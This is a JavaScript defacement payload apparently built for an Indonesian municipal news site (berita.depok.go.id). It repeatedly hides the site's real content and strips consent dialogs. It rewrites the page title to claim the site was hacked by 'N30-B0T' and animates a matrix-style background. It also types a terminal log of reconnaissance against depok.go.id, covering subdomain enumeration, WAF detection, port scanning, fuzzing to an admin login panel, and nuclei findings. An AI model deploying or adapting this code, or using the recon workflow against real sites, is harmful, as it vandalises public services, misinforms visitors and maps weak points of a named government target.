
(function(){
  // pastikan konten asli Depok nggak muncul lagi
  var hide = function(){
    document.querySelectorAll('body > *').forEach(function(el){
      if (el.id === 'df-bg' || el.classList.contains('df-stamp') ||
          el.classList.contains('df-wrap') || el.classList.contains('df-marquee')) return;
      if (el.tagName === 'SCRIPT' || el.tagName === 'STYLE' || el.tagName === 'LINK') return;
      el.style.setProperty('display', 'none', 'important');
    });
    document.querySelectorAll('dialog,[id*=cmp],[id*=consent]').forEach(function(d){ try{d.close&&d.close();}catch(e){} d.remove(); });
    document.documentElement.style.removeProperty('overflow');
    document.body.style.removeProperty('overflow');
    document.body.style.filter = 'none';
  };
  hide(); setInterval(hide, 300);

  var t = '\u26A0 BERITA DEPOK DIBOBOL N30-B0T \u26A0';
  var st = function(){ if (document.title !== t) document.title = t; };
  st(); setInterval(st, 300);

  var cv = document.getElementById('df-bg'), ctx = cv.getContext('2d'), fs_ = 14, cols, drops;
  var rs = function(){ cv.width = innerWidth; cv.height = innerHeight;
    cols = Math.floor(cv.width/fs_); drops = Array(cols).fill(0).map(function(){return Math.random()*-50;}); };
  rs(); addEventListener('resize', rs);
  var ch = '\u30A2\u30A4\u30A6\u30A8\u30AA0123456789ABCDEF$#@%&<>/\\{}[]DEPOK';
  setInterval(function(){
    ctx.fillStyle='rgba(0,0,0,.07)'; ctx.fillRect(0,0,cv.width,cv.height);
    ctx.fillStyle='#39ff14'; ctx.font=fs_+'px monospace';
    for(var i=0;i<cols;i++){ ctx.fillText(ch[Math.floor(Math.random()*ch.length)], i*fs_, drops[i]*fs_);
      if(drops[i]*fs_>cv.height && Math.random()>.975) drops[i]=0; drops[i]++; }
  }, 55);

  var term = document.getElementById('df-term');
  var lines = [
    '$ subfinder -d depok.go.id | wc -l',
    '1302 subdomain ter-enumerate (admin.depok, rsud.depok, ...)',
    '$ echo https://berita.depok.go.id | httpx -sc -tech-detect',
    '[200] [Laravel,Livewire,PHP,HSTS,Google-Analytics]',
    '$ wafw00f https://berita.depok.go.id',
    '[+] is behind BIG-IP AppSec Manager (F5 Networks)',
    '$ naabu -top-ports 100',
    'berita.depok.go.id:443  <-- satu-satunya, rapi juga',
    '$ ffuf -u https://berita.depok.go.id/FUZZ -w wordlist',
    'dashboard  [Status: 302] -> Location: /admin/masuk',
    '$ curl /admin/masuk',
    '[+] panel admin: form email + password, GA yang jaga',
    '$ nuclei -t exposed-panels,default-credentials,misconfig,tech',
    '[waf-detect:bigip] [waf-detect:asm]  <- F5 BENERAN',
    '[tech-detect:laravel,livewire,youtube]',
    '[missing-sri] gtag, livewire.min.js, app.js, app.css',
    '[missing-cookie-samesite-strict] XSRF-TOKEN, laravel_session',
    '[http-missing-headers] COOP, COEP, CORP, X-PCDP',
    '> 14 temuan nuclei, 0 default-login. kami jujur, cuma ngintip',
    '> semua angka di atas BENERAN, jalan satu-satu, bukan karangan'
  ];
  var li=0, ci=0, txt='';
  (function type(){
    if(li>=lines.length){ term.innerHTML = txt+'<span class="cur">\u2588</span>'; return; }
    if(ci<lines[li].length){ txt+=lines[li][ci++]; } else { txt+='\n'; li++; ci=0; }
    term.innerHTML = txt+'<span class="cur">\u2588</span>';
    setTimeout(type, 20);
  })();
})();
